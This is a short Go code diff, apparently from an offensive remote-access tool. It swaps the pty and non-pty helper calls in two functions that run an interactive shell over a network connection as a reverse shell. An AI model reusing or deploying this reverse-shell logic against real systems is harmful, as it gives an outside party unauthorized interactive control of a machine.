@@ -145,7 +145,7 @@ func OpenPcapReverseShell(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	return runPcapShellPty(exec.Command(getShell(), "-i"), conn)
+	return runPcapShell(exec.Command(getShell(), "-i"), conn)
 }
 
 // runPcapShellPty owns stdin copying so process exit does not wait for network EOF.
@@ -240,5 +240,5 @@ func OpenPcapReverseShellPty(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	return runPcapShell(exec.Command(getShell(), "-i"), conn)
+	return runPcapShellPty(exec.Command(getShell(), "-i"), conn)
 }
